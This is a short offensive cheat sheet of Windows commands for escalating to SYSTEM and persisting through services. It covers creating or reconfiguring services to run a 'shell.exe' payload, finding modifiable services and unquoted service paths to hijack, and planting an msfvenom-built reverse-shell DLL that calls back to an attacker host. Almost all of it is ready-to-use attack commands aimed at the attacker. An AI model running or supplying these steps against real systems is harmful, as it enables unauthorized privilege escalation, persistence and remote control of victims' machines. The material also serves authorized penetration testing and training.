# Service Creation & Persistence

### Create a service for SYSTEM shell

sc.exe create — If you have local admin but need SYSTEM

```bash
sc.exe create reverse binPath= "C:\Windows\Temp\shell.exe" start= auto
sc.exe start reverse
```

---

### Modify existing service binary path

Change service to point to your payload

```bash
sc.exe config <service> binPath= "C:\Windows\Temp\shell.exe"
sc.exe stop <service>
sc.exe start <service>
```

---

### Check service permissions

Which services can you modify

```bash
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
# SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS = exploitable
```

---

### Unquoted service paths

If service path has spaces and no quotes — Hijack with binary in parent directory

```bash
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"
# Path: C:\Program Files\My App\service.exe
# Place payload at: C:\Program.exe or C:\Program Files\My.exe
```

---

### DLL hijacking via service

Replace DLL loaded by service — Runs as service account

```bash
sc.exe qc <service>
icacls "C:\Program Files\Vulnerable App\"
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o hijack.dll
sc.exe stop <service> && sc.exe start <service>
```

---
